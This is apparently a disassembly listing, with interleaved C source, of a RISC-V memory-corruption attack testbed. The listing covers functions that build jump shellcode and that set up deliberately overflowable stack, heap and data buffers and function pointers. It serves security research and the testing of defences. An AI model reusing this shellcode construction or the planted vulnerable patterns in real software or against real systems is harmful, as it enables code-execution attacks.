800425f0:	80046537          	lui	a0,0x80046
800425f4:	cbc50513          	addi	a0,a0,-836 # 80045cbc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045cbd>
800425f8:	2a5010ef          	jal	ra,8004409c <printk>
}			
800425fc:	40b2                	lw	ra,12(sp)
800425fe:	4422                	lw	s0,8(sp)
80042600:	4492                	lw	s1,4(sp)
80042602:	4902                	lw	s2,0(sp)
80042604:	0141                	addi	sp,sp,16
80042606:	8082                	ret

80042608 <hex_to_string>:
} /* build_shellcode */

// convert a 32-bit hex value to padded, 8-char string
void
hex_to_string(char * str, size_t val)
{
80042608:	1141                	addi	sp,sp,-16
8004260a:	c606                	sw	ra,12(sp)
8004260c:	c422                	sw	s0,8(sp)
8004260e:	842a                	mv	s0,a0
    // store value in string and prepend 0s as necessary
    snprintf(str, 9, "%8x", val);
80042610:	86ae                	mv	a3,a1
80042612:	80045637          	lui	a2,0x80045
80042616:	65c60613          	addi	a2,a2,1628 # 8004565c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004565d>
8004261a:	45a5                	li	a1,9
8004261c:	e24fe0ef          	jal	ra,80040c40 <sniprintf>

    for (int i = 0; i < 9; i++) {
80042620:	4781                	li	a5,0
80042622:	a011                	j	80042626 <hex_to_string+0x1e>
80042624:	0785                	addi	a5,a5,1
80042626:	4721                	li	a4,8
80042628:	00f74f63          	blt	a4,a5,80042646 <hex_to_string+0x3e>
        if (str[i] == ' ') str[i] = '0';
8004262c:	00f40733          	add	a4,s0,a5
80042630:	00074603          	lbu	a2,0(a4)
80042634:	02000693          	li	a3,32
80042638:	fed616e3          	bne	a2,a3,80042624 <hex_to_string+0x1c>
8004263c:	03000693          	li	a3,48
80042640:	00d70023          	sb	a3,0(a4)
80042644:	b7c5                	j	80042624 <hex_to_string+0x1c>
    }
}
80042646:	40b2                	lw	ra,12(sp)
80042648:	4422                	lw	s0,8(sp)
8004264a:	0141                	addi	sp,sp,16
8004264c:	8082                	ret

8004264e <format_instruction>:

// format instruction and append to destination string
void
format_instruction(char * dest, size_t insn)
{
8004264e:	1141                	addi	sp,sp,-16
    char insn_bytes[4];

    insn_bytes[0] = (insn >> 24) & 0xff;
80042650:	0185d793          	srli	a5,a1,0x18
80042654:	00f10623          	sb	a5,12(sp)
    insn_bytes[1] = (insn >> 16) & 0xff;
80042658:	0105d793          	srli	a5,a1,0x10
8004265c:	00f106a3          	sb	a5,13(sp)
    insn_bytes[2] = (insn >> 8) & 0xff;
80042660:	0085d793          	srli	a5,a1,0x8
80042664:	00f10723          	sb	a5,14(sp)
    insn_bytes[3] = insn & 0xff;
80042668:	00b107a3          	sb	a1,15(sp)

    for (int i = 3; i >= 0; i--) {
8004266c:	470d                	li	a4,3
8004266e:	a819                	j	80042684 <format_instruction+0x36>
        dest[3 - i] = insn_bytes[i];
80042670:	478d                	li	a5,3
80042672:	8f99                	sub	a5,a5,a4
80042674:	97aa                	add	a5,a5,a0
80042676:	0814                	addi	a3,sp,16
80042678:	96ba                	add	a3,a3,a4
8004267a:	ffc6c683          	lbu	a3,-4(a3)
8004267e:	00d78023          	sb	a3,0(a5)
    for (int i = 3; i >= 0; i--) {
80042682:	177d                	addi	a4,a4,-1
80042684:	fe0756e3          	bgez	a4,80042670 <format_instruction+0x22>
    }
}
80042688:	0141                	addi	sp,sp,16
8004268a:	8082                	ret

8004268c <build_shellcode>:
{
8004268c:	7135                	addi	sp,sp,-160
8004268e:	cf06                	sw	ra,156(sp)
80042690:	cd22                	sw	s0,152(sp)
80042692:	cb26                	sw	s1,148(sp)
80042694:	c94a                	sw	s2,144(sp)
80042696:	c74e                	sw	s3,140(sp)
80042698:	84aa                	mv	s1,a0
    memset(attack_addr, 0, sizeof(attack_addr) );
8004269a:	da82                	sw	zero,116(sp)
8004269c:	dc82                	sw	zero,120(sp)
8004269e:	06010e23          	sb	zero,124(sp)
    memset(low_bits,    0, sizeof(low_bits) );
800426a2:	d882                	sw	zero,112(sp)
    memset(high_bits,   0, sizeof(high_bits) );
800426a4:	d482                	sw	zero,104(sp)
800426a6:	06011623          	sh	zero,108(sp)
    memset(lui_bin,     0, sizeof(lui_bin) );
800426aa:	c282                	sw	zero,68(sp)
800426ac:	c482                	sw	zero,72(sp)
800426ae:	c682                	sw	zero,76(sp)
800426b0:	c882                	sw	zero,80(sp)
800426b2:	ca82                	sw	zero,84(sp)
800426b4:	cc82                	sw	zero,88(sp)
800426b6:	ce82                	sw	zero,92(sp)
800426b8:	d082                	sw	zero,96(sp)
800426ba:	06010223          	sb	zero,100(sp)
    memset(addi_bin,    0, sizeof(addi_bin) );
800426be:	d002                	sw	zero,32(sp)
800426c0:	d202                	sw	zero,36(sp)
800426c2:	d402                	sw	zero,40(sp)
800426c4:	d602                	sw	zero,44(sp)
800426c6:	d802                	sw	zero,48(sp)
800426c8:	da02                	sw	zero,52(sp)
800426ca:	dc02                	sw	zero,56(sp)
800426cc:	de02                	sw	zero,60(sp)
800426ce:	04010023          	sb	zero,64(sp)
    memset(lui_s,       0, sizeof(lui_s) );
800426d2:	ca02                	sw	zero,20(sp)
800426d4:	cc02                	sw	zero,24(sp)
800426d6:	00010e23          	sb	zero,28(sp)
    memset(addi_s,      0, sizeof(addi_s) );
800426da:	c402                	sw	zero,8(sp)
800426dc:	c602                	sw	zero,12(sp)
800426de:	00010823          	sb	zero,16(sp)
	if (((unsigned long)&shellcode_target & 0x00000fff) >= 0x800)
800426e2:	800425b7          	lui	a1,0x80042
800426e6:	2de58593          	addi	a1,a1,734 # 800422de <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800422df>
800426ea:	6785                	lui	a5,0x1
800426ec:	80078793          	addi	a5,a5,-2048 # 800 <CONFIG_IDLE_STACK_SIZE+0x400>
800426f0:	8fed                	and	a5,a5,a1
800426f2:	cfa9                	beqz	a5,8004274c <build_shellcode+0xc0>
		hex_to_string(attack_addr, &shellcode_target + 0x1000);
800426f4:	800435b7          	lui	a1,0x80043
800426f8:	2de58593          	addi	a1,a1,734 # 800432de <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800432df>
800426fc:	18c8                	addi	a0,sp,116
800426fe:	3729                	jal	80042608 <hex_to_string>
    strncpy(low_bits, &attack_addr[5], 3);
80042700:	460d                	li	a2,3
80042702:	07910593          	addi	a1,sp,121
80042706:	1888                	addi	a0,sp,112
80042708:	935fe0ef          	jal	ra,8004103c <strncpy>
    strncpy(high_bits, attack_addr, 5);
8004270c:	4615                	li	a2,5
8004270e:	18cc                	addi	a1,sp,116
80042710:	10a8                	addi	a0,sp,104
80042712:	92bfe0ef          	jal	ra,8004103c <strncpy>
    jalr_val = strtoul(jalr_s, 0, 16);
80042716:	4641                	li	a2,16
80042718:	4581                	li	a1,0
8004271a:	80045537          	lui	a0,0x80045
8004271e:	54850513          	addi	a0,a0,1352 # 80045548 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045549>
80042722:	ad7fe0ef          	jal	ra,800411f8 <strtoul>
80042726:	89aa                	mv	s3,a0
    for (int i = 0; i < 5; i++) {
80042728:	4401                	li	s0,0
8004272a:	4791                	li	a5,4
8004272c:	0287c363          	blt	a5,s0,80042752 <build_shellcode+0xc6>
        strncat(lui_bin, hex_to_bin(high_bits[i]), 4);
80042730:	011c                	addi	a5,sp,128
80042732:	97a2                	add	a5,a5,s0
80042734:	fe87c503          	lbu	a0,-24(a5)
80042738:	36e5                	jal	80042320 <hex_to_bin>
8004273a:	02100693          	li	a3,33
8004273e:	4611                	li	a2,4
80042740:	85aa                	mv	a1,a0
80042742:	00c8                	addi	a0,sp,68
80042744:	899fe0ef          	jal	ra,80040fdc <__strncat_chk>
    for (int i = 0; i < 5; i++) {
80042748:	0405                	addi	s0,s0,1
8004274a:	b7c5                	j	8004272a <build_shellcode+0x9e>
		hex_to_string(attack_addr, &shellcode_target);
8004274c:	18c8                	addi	a0,sp,116
8004274e:	3d6d                	jal	80042608 <hex_to_string>
80042750:	bf45                	j	80042700 <build_shellcode+0x74>
    strncat(lui_bin, "001100110111", 12);
80042752:	02100613          	li	a2,33
80042756:	800455b7          	lui	a1,0x80045
8004275a:	55458593          	addi	a1,a1,1364 # 80045554 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045555>
8004275e:	00c8                	addi	a0,sp,68
80042760:	dc8fe0ef          	jal	ra,80040d28 <__strcat_chk>
    lui_val = strtoul(lui_bin, 0, 2);
80042764:	4609                	li	a2,2
80042766:	4581                	li	a1,0
80042768:	00c8                	addi	a0,sp,68
8004276a:	a8ffe0ef          	jal	ra,800411f8 <strtoul>
8004276e:	892a                	mv	s2,a0
    hex_to_string(lui_s, lui_val);
80042770:	85aa                	mv	a1,a0
80042772:	0848                	addi	a0,sp,20
80042774:	3d51                	jal	80042608 <hex_to_string>
    for (int i = 0; i < 3; i++) {
80042776:	4401                	li	s0,0
80042778:	a831                	j	80042794 <build_shellcode+0x108>
        strncat(addi_bin, hex_to_bin(low_bits[i]), 4);
8004277a:	011c                	addi	a5,sp,128
8004277c:	97a2                	add	a5,a5,s0
8004277e:	ff07c503          	lbu	a0,-16(a5)
80042782:	3e79                	jal	80042320 <hex_to_bin>
80042784:	02100693          	li	a3,33
80042788:	4611                	li	a2,4
8004278a:	85aa                	mv	a1,a0
8004278c:	1008                	addi	a0,sp,32
8004278e:	84ffe0ef          	jal	ra,80040fdc <__strncat_chk>
    for (int i = 0; i < 3; i++) {
80042792:	0405                	addi	s0,s0,1
80042794:	4789                	li	a5,2
80042796:	fe87d2e3          	bge	a5,s0,8004277a <build_shellcode+0xee>
    strncat(addi_bin, "00110000001100010011", 20);
8004279a:	02100613          	li	a2,33
8004279e:	800455b7          	lui	a1,0x80045
800427a2:	56458593          	addi	a1,a1,1380 # 80045564 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045565>
800427a6:	1008                	addi	a0,sp,32
800427a8:	d80fe0ef          	jal	ra,80040d28 <__strcat_chk>
    addi_val = strtoul(addi_bin, 0, 2);
800427ac:	4609                	li	a2,2
800427ae:	4581                	li	a1,0
800427b0:	1008                	addi	a0,sp,32
800427b2:	a47fe0ef          	jal	ra,800411f8 <strtoul>
800427b6:	842a                	mv	s0,a0
    hex_to_string(addi_s, addi_val);
800427b8:	85aa                	mv	a1,a0
800427ba:	0028                	addi	a0,sp,8
800427bc:	35b1                	jal	80042608 <hex_to_string>
    format_instruction(shellcode, lui_val);
800427be:	85ca                	mv	a1,s2
800427c0:	8526                	mv	a0,s1
800427c2:	3571                	jal	8004264e <format_instruction>
    format_instruction(shellcode + 4, addi_val);
800427c4:	85a2                	mv	a1,s0
800427c6:	00448513          	addi	a0,s1,4
800427ca:	3551                	jal	8004264e <format_instruction>
    format_instruction(shellcode + 8, jalr_val);
800427cc:	85ce                	mv	a1,s3
800427ce:	00848513          	addi	a0,s1,8
800427d2:	3db5                	jal	8004264e <format_instruction>
    hex_to_string(lui_s, lui_val);
800427d4:	85ca                	mv	a1,s2
800427d6:	0848                	addi	a0,sp,20
800427d8:	3d05                	jal	80042608 <hex_to_string>
    hex_to_string(addi_s, addi_val);
800427da:	85a2                	mv	a1,s0
800427dc:	0028                	addi	a0,sp,8
800427de:	352d                	jal	80042608 <hex_to_string>
        printf("----------------\nShellcode instructions:\n");
800427e0:	80045537          	lui	a0,0x80045
800427e4:	57c50513          	addi	a0,a0,1404 # 8004557c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004557d>
800427e8:	0b5010ef          	jal	ra,8004409c <printk>
        printf("%s0x%-20s%14s\n", "lui t1,  ", high_bits, lui_s);
800427ec:	0854                	addi	a3,sp,20
800427ee:	10b0                	addi	a2,sp,104
800427f0:	800455b7          	lui	a1,0x80045
800427f4:	5a858593          	addi	a1,a1,1448 # 800455a8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800455a9>
800427f8:	80045537          	lui	a0,0x80045
800427fc:	5b450513          	addi	a0,a0,1460 # 800455b4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800455b5>
80042800:	09d010ef          	jal	ra,8004409c <printk>
        printf("%s0x%-20s%10s\n", "addi t1, t1, ", low_bits, addi_s);
80042804:	0034                	addi	a3,sp,8
80042806:	1890                	addi	a2,sp,112
80042808:	800455b7          	lui	a1,0x80045
8004280c:	5c458593          	addi	a1,a1,1476 # 800455c4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800455c5>
80042810:	80045537          	lui	a0,0x80045
80042814:	5d450513          	addi	a0,a0,1492 # 800455d4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800455d5>
80042818:	085010ef          	jal	ra,8004409c <printk>
        printf("%s%38s\n----------------\n", "jalr t1", jalr_s);
8004281c:	80045637          	lui	a2,0x80045
80042820:	54860613          	addi	a2,a2,1352 # 80045548 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045549>
80042824:	800455b7          	lui	a1,0x80045
80042828:	5e458593          	addi	a1,a1,1508 # 800455e4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800455e5>
8004282c:	80045537          	lui	a0,0x80045
80042830:	5ec50513          	addi	a0,a0,1516 # 800455ec <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800455ed>
80042834:	069010ef          	jal	ra,8004409c <printk>
} /* build_shellcode */
80042838:	40fa                	lw	ra,156(sp)
8004283a:	446a                	lw	s0,152(sp)
8004283c:	44da                	lw	s1,148(sp)
8004283e:	494a                	lw	s2,144(sp)
80042840:	49ba                	lw	s3,140(sp)
80042842:	610d                	addi	sp,sp,160
80042844:	8082                	ret

80042846 <perform_attack>:
{
80042846:	91010113          	addi	sp,sp,-1776
8004284a:	6e112623          	sw	ra,1772(sp)
8004284e:	6e812423          	sw	s0,1768(sp)
80042852:	6e912223          	sw	s1,1764(sp)
80042856:	6f212023          	sw	s2,1760(sp)
8004285a:	6d312e23          	sw	s3,1756(sp)
8004285e:	6d412c23          	sw	s4,1752(sp)
80042862:	6f010413          	addi	s0,sp,1776
80042866:	92a42e23          	sw	a0,-1732(s0)
8004286a:	92b42c23          	sw	a1,-1736(s0)
	strcpy(stack_secret, data_secret);
8004286e:	02000613          	li	a2,32
80042872:	800475b7          	lui	a1,0x80047
80042876:	be858593          	addi	a1,a1,-1048 # 80046be8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046be9>
8004287a:	e8040513          	addi	a0,s0,-384
8004287e:	e96fe0ef          	jal	ra,80040f14 <__strcpy_chk>
    stack_struct.func_ptr = &dummy_function;
80042882:	800424b7          	lui	s1,0x80042
80042886:	2c648493          	addi	s1,s1,710 # 800422c6 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800422c7>
8004288a:	a6942e23          	sw	s1,-1412(s0)
      (struct attackme *) malloc(sizeof(struct attackme));
8004288e:	10400513          	li	a0,260
80042892:	dfffd0ef          	jal	ra,80040690 <malloc>
80042896:	92a42623          	sw	a0,-1748(s0)
    heap_struct->func_ptr = dummy_function;
8004289a:	10952023          	sw	s1,256(a0)
    char * heap_buffer1 = (char *) malloc(256 + sizeof(long));
8004289e:	10400513          	li	a0,260
800428a2:	deffd0ef          	jal	ra,80040690 <malloc>
800428a6:	84aa                	mv	s1,a0
    char * heap_buffer2 = (char *) malloc(256 + sizeof(long));
800428a8:	10400513          	li	a0,260
800428ac:	de5fd0ef          	jal	ra,80040690 <malloc>
800428b0:	892a                	mv	s2,a0
    char * heap_buffer3 = (char *) malloc(256 + sizeof(long));
800428b2:	10400513          	li	a0,260
800428b6:	ddbfd0ef          	jal	ra,80040690 <malloc>
800428ba:	8a2a                	mv	s4,a0
    int * heap_flag = (int *) malloc(sizeof(int *));
800428bc:	4511                	li	a0,4
800428be:	dd3fd0ef          	jal	ra,80040690 <malloc>
    int(**heap_func_ptr)(const char *) = 0;
800428c2:	92042a23          	sw	zero,-1740(s0)
    if (heap_buffer1 == NULL || heap_buffer2 == NULL) {
800428c6:	c0dd                	beqz	s1,8004296c <perform_attack+0x126>
800428c8:	89aa                	mv	s3,a0
800428ca:	0a090163          	beqz	s2,8004296c <perform_attack+0x126>
    bss_buffer[0]  = 'a';
800428ce:	800477b7          	lui	a5,0x80047
800428d2:	06100713          	li	a4,97
800428d6:	f0e78a23          	sb	a4,-236(a5) # 80046f14 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f15>
  	strcpy(bss_secret, data_secret);
800428da:	02000613          	li	a2,32
800428de:	800475b7          	lui	a1,0x80047
800428e2:	be858593          	addi	a1,a1,-1048 # 80046be8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046be9>
800428e6:	80047537          	lui	a0,0x80047
800428ea:	01450513          	addi	a0,a0,20 # 80047014 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047015>
800428ee:	e26fe0ef          	jal	ra,80040f14 <__strcpy_chk>
    build_shellcode(shellcode_nonop);
800428f2:	80047537          	lui	a0,0x80047
800428f6:	13850513          	addi	a0,a0,312 # 80047138 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047139>
800428fa:	3b49                	jal	8004268c <build_shellcode>
    switch (attack.location) {
800428fc:	800477b7          	lui	a5,0x80047
80042900:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042904:	47dc                	lw	a5,12(a5)
80042906:	19100713          	li	a4,401
8004290a:	14e78463          	beq	a5,a4,80042a52 <perform_attack+0x20c>
8004290e:	06f77863          	bgeu	a4,a5,8004297e <perform_attack+0x138>
80042912:	19200713          	li	a4,402
80042916:	20e78f63          	beq	a5,a4,80042b34 <perform_attack+0x2ee>
8004291a:	19300713          	li	a4,403
8004291e:	0ae79263          	bne	a5,a4,800429c2 <perform_attack+0x17c>
            if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
80042922:	800477b7          	lui	a5,0x80047
80042926:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
8004292a:	479c                	lw	a5,8(a5)
8004292c:	13900713          	li	a4,313
80042930:	1ae78d63          	beq	a5,a4,80042aea <perform_attack+0x2a4>
            if ((attack.code_ptr == FUNC_PTR_DATA ||
80042934:	13100713          	li	a4,305
80042938:	1ce78063          	beq	a5,a4,80042af8 <perform_attack+0x2b2>
8004293c:	13b00713          	li	a4,315
80042940:	1ae78c63          	beq	a5,a4,80042af8 <perform_attack+0x2b2>
                buffer = data_buffer1;
80042944:	800477b7          	lui	a5,0x80047
80042948:	8e878793          	addi	a5,a5,-1816 # 800468e8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800468e9>
8004294c:	96f42c23          	sw	a5,-1672(s0)
            if (attack.inject_param == DATA_ONLY) {
80042950:	800477b7          	lui	a5,0x80047
80042954:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042958:	43d8                	lw	a4,4(a5)
8004295a:	0cb00793          	li	a5,203
8004295e:	1af70c63          	beq	a4,a5,80042b16 <perform_attack+0x2d0>
            heap_jmp_buffer = heap_buffer1;
80042962:	92942423          	sw	s1,-1752(s0)
            heap_func_ptr   = (void *) heap_buffer1;
80042966:	92942a23          	sw	s1,-1740(s0)
8004296a:	a8a1                	j	800429c2 <perform_attack+0x17c>
        printk("Unable to allocate heap memory.");
8004296c:	80046537          	lui	a0,0x80046
80042970:	a8c50513          	addi	a0,a0,-1396 # 80045a8c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045a8d>
80042974:	728010ef          	jal	ra,8004409c <printk>
        exit(1);
80042978:	4505                	li	a0,1
8004297a:	cd3fd0ef          	jal	ra,8004064c <exit>
    switch (attack.location) {
8004297e:	19000713          	li	a4,400
80042982:	04e79063          	bne	a5,a4,800429c2 <perform_attack+0x17c>
            if (attack.code_ptr == STRUCT_FUNC_PTR_STACK &&
80042986:	800477b7          	lui	a5,0x80047
8004298a:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
8004298e:	479c                	lw	a5,8(a5)
80042990:	13700713          	li	a4,311
80042994:	06e78d63          	beq	a5,a4,80042a0e <perform_attack+0x1c8>
            } else if (attack.code_ptr == FUNC_PTR_STACK_PARAM &&
80042998:	12e00713          	li	a4,302
8004299c:	08e78663          	beq	a5,a4,80042a28 <perform_attack+0x1e2>
                buffer = stack_buffer;
800429a0:	a8040793          	addi	a5,s0,-1408
800429a4:	96f42c23          	sw	a5,-1672(s0)
            if (attack.inject_param == DATA_ONLY) {
800429a8:	800477b7          	lui	a5,0x80047
800429ac:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800429b0:	43d8                	lw	a4,4(a5)
800429b2:	0cb00793          	li	a5,203
800429b6:	08f70563          	beq	a4,a5,80042a40 <perform_attack+0x1fa>
            heap_jmp_buffer = (void *) heap_buffer1;
800429ba:	92942423          	sw	s1,-1752(s0)
            heap_func_ptr   = (void *) heap_buffer1;
800429be:	92942a23          	sw	s1,-1740(s0)
    if (heap_func_ptr)
800429c2:	93442703          	lw	a4,-1740(s0)
800429c6:	c711                	beqz	a4,800429d2 <perform_attack+0x18c>
        *heap_func_ptr = dummy_function;
800429c8:	800427b7          	lui	a5,0x80042
800429cc:	2c678793          	addi	a5,a5,710 # 800422c6 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800422c7>
800429d0:	c31c                	sw	a5,0(a4)
    switch (attack.technique) {
800429d2:	800477b7          	lui	a5,0x80047
800429d6:	f007a783          	lw	a5,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800429da:	06400713          	li	a4,100
800429de:	1ce78d63          	beq	a5,a4,80042bb8 <perform_attack+0x372>
800429e2:	06500713          	li	a4,101
800429e6:	32e78963          	beq	a5,a4,80042d18 <perform_attack+0x4d2>
    switch (attack.code_ptr) {
800429ea:	800477b7          	lui	a5,0x80047
800429ee:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800429f2:	479c                	lw	a5,8(a5)
800429f4:	ece78793          	addi	a5,a5,-306
800429f8:	4711                	li	a4,4
800429fa:	40f76563          	bltu	a4,a5,80042e04 <perform_attack+0x5be>
800429fe:	078a                	slli	a5,a5,0x2
80042a00:	80045737          	lui	a4,0x80045
80042a04:	3d870713          	addi	a4,a4,984 # 800453d8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800453d9>
80042a08:	97ba                	add	a5,a5,a4
80042a0a:	439c                	lw	a5,0(a5)
80042a0c:	8782                	jr	a5
              attack.technique == DIRECT)
80042a0e:	80047737          	lui	a4,0x80047
80042a12:	f0072683          	lw	a3,-256(a4) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
            if (attack.code_ptr == STRUCT_FUNC_PTR_STACK &&
80042a16:	06400713          	li	a4,100
80042a1a:	f6e69fe3          	bne	a3,a4,80042998 <perform_attack+0x152>
                buffer = stack_struct.buffer;
80042a1e:	97c40793          	addi	a5,s0,-1668
80042a22:	96f42c23          	sw	a5,-1672(s0)
80042a26:	b749                	j	800429a8 <perform_attack+0x162>
              attack.technique == DIRECT)
80042a28:	800477b7          	lui	a5,0x80047
80042a2c:	f007a703          	lw	a4,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
            } else if (attack.code_ptr == FUNC_PTR_STACK_PARAM &&
80042a30:	06400793          	li	a5,100
80042a34:	f6f716e3          	bne	a4,a5,800429a0 <perform_attack+0x15a>
                set_low_buf(&buffer);
80042a38:	97840513          	addi	a0,s0,-1672
80042a3c:	3c65                	jal	800424f4 <set_low_buf>
80042a3e:	b7ad                	j	800429a8 <perform_attack+0x162>
                stack_mem_ptr = &stack_flag;
80042a40:	ea040793          	addi	a5,s0,-352
80042a44:	eaf42423          	sw	a5,-344(s0)
            heap_jmp_buffer = (void *) heap_buffer1;
80042a48:	92942423          	sw	s1,-1752(s0)
            heap_func_ptr   = (void *) heap_buffer1;
80042a4c:	92942a23          	sw	s1,-1740(s0)
80042a50:	bf8d                	j	800429c2 <perform_attack+0x17c>
            if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP &&
80042a52:	800477b7          	lui	a5,0x80047
80042a56:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042a5a:	479c                	lw	a5,8(a5)
80042a5c:	13800713          	li	a4,312
80042a60:	04e78563          	beq	a5,a4,80042aaa <perform_attack+0x264>
            if (((unsigned long) heap_buffer1 < (unsigned long) heap_buffer2) &&
80042a64:	0724fa63          	bgeu	s1,s2,80042ad8 <perform_attack+0x292>
80042a68:	07497863          	bgeu	s2,s4,80042ad8 <perform_attack+0x292>
                buffer = heap_buffer1;
80042a6c:	96942c23          	sw	s1,-1672(s0)
                heap_mem_ptr_aux = (long *) heap_buffer2;
80042a70:	91242e23          	sw	s2,-1764(s0)
                heap_mem_ptr     = (long *) heap_buffer3;
80042a74:	93442023          	sw	s4,-1760(s0)
				if (attack.code_ptr == VAR_LEAK) {
80042a78:	13d00713          	li	a4,317
80042a7c:	04e78463          	beq	a5,a4,80042ac4 <perform_attack+0x27e>
                heap_func_ptr = malloc(sizeof(void *));
80042a80:	4511                	li	a0,4
80042a82:	c0ffd0ef          	jal	ra,80040690 <malloc>
80042a86:	92a42a23          	sw	a0,-1740(s0)
                heap_jmp_buffer = (int *) malloc(sizeof(jmp_buf));
80042a8a:	13000513          	li	a0,304
80042a8e:	c03fd0ef          	jal	ra,80040690 <malloc>
            if (attack.inject_param == DATA_ONLY) {
80042a92:	800477b7          	lui	a5,0x80047
80042a96:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042a9a:	43d8                	lw	a4,4(a5)
80042a9c:	0cb00793          	li	a5,203
80042aa0:	10f70763          	beq	a4,a5,80042bae <perform_attack+0x368>
                heap_jmp_buffer = (int *) malloc(sizeof(jmp_buf));
80042aa4:	92a42423          	sw	a0,-1752(s0)
80042aa8:	bf29                	j	800429c2 <perform_attack+0x17c>
              attack.technique == DIRECT)
80042aaa:	80047737          	lui	a4,0x80047
80042aae:	f0072683          	lw	a3,-256(a4) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
            if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP &&
80042ab2:	06400713          	li	a4,100
80042ab6:	fae697e3          	bne	a3,a4,80042a64 <perform_attack+0x21e>
                buffer = heap_struct->buffer;
80042aba:	92c42783          	lw	a5,-1748(s0)
80042abe:	96f42c23          	sw	a5,-1672(s0)
                break;
80042ac2:	b701                	j	800429c2 <perform_attack+0x17c>
					strcpy(heap_secret, data_secret);
80042ac4:	10400613          	li	a2,260
80042ac8:	800475b7          	lui	a1,0x80047
80042acc:	be858593          	addi	a1,a1,-1048 # 80046be8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046be9>
80042ad0:	854a                	mv	a0,s2
80042ad2:	c42fe0ef          	jal	ra,80040f14 <__strcpy_chk>
80042ad6:	b76d                	j	80042a80 <perform_attack+0x23a>
                    fprintf(stderr,
80042ad8:	80046537          	lui	a0,0x80046
80042adc:	aac50513          	addi	a0,a0,-1364 # 80045aac <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045aad>
80042ae0:	5bc010ef          	jal	ra,8004409c <printk>
                exit(1);
80042ae4:	4505                	li	a0,1
80042ae6:	b67fd0ef          	jal	ra,8004064c <exit>
                buffer = data_struct.buffer;
80042aea:	800477b7          	lui	a5,0x80047
80042aee:	c0878793          	addi	a5,a5,-1016 # 80046c08 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046c09>
80042af2:	96f42c23          	sw	a5,-1672(s0)
                break;
80042af6:	b5f1                	j	800429c2 <perform_attack+0x17c>
              attack.technique == DIRECT)
80042af8:	800477b7          	lui	a5,0x80047
80042afc:	f007a703          	lw	a4,-256(a5) # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
              attack.code_ptr == VAR_BOF) &&
80042b00:	06400793          	li	a5,100
80042b04:	e4f710e3          	bne	a4,a5,80042944 <perform_attack+0xfe>
                buffer = data_buffer2;
80042b08:	800477b7          	lui	a5,0x80047
80042b0c:	d0c78793          	addi	a5,a5,-756 # 80046d0c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d0d>
80042b10:	96f42c23          	sw	a5,-1672(s0)
80042b14:	bd35                	j	80042950 <perform_attack+0x10a>
                data_flag     = 0;
80042b16:	800477b7          	lui	a5,0x80047
80042b1a:	d1478793          	addi	a5,a5,-748 # 80046d14 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d15>
80042b1e:	0007a023          	sw	zero,0(a5)
                *data_mem_ptr = &data_flag;
80042b22:	80047737          	lui	a4,0x80047
80042b26:	9ef72423          	sw	a5,-1560(a4) # 800469e8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800469e9>
            heap_jmp_buffer = heap_buffer1;
80042b2a:	92942423          	sw	s1,-1752(s0)
            heap_func_ptr   = (void *) heap_buffer1;
80042b2e:	92942a23          	sw	s1,-1740(s0)
80042b32:	bd41                	j	800429c2 <perform_attack+0x17c>
